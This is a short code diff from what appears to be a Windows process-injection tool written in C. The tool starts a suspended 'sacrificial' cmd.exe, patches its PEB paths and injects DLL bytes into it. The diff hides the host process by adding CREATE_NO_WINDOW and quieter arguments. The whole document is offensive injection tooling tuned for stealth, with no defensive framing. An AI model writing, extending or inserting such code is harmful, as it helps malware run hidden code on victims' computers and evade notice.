@@ -644,7 +644,7 @@ static void sr_patch_peb_paths(HANDLE hProcess,
 
 /* Default sacrificial process — stays alive long enough for injection */
 #define SR_DEFAULT_HOST L"cmd.exe"
-#define SR_DEFAULT_ARGS L"/c ping -t 127.0.0.1 >nul 2>&1"
+#define SR_DEFAULT_ARGS L"/c pause >nul"
 
 static BOOL inject_suspended_child(const void *dll_bytes, size_t dll_size,
                                     const wchar_t *host_exe,
@@ -683,7 +683,7 @@ static BOOL inject_suspended_child(const void *dll_bytes, size_t dll_size,
     LOG("CreateProcessW: '%ls'", cmdline);
 
     if (!CreateProcessW(NULL, cmdline, NULL, NULL, FALSE,
-                        CREATE_SUSPENDED,
+                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                         NULL, NULL, &si, &pi)) {
         ERR("CreateProcessW failed: %lu", GetLastError());
         return FALSE;
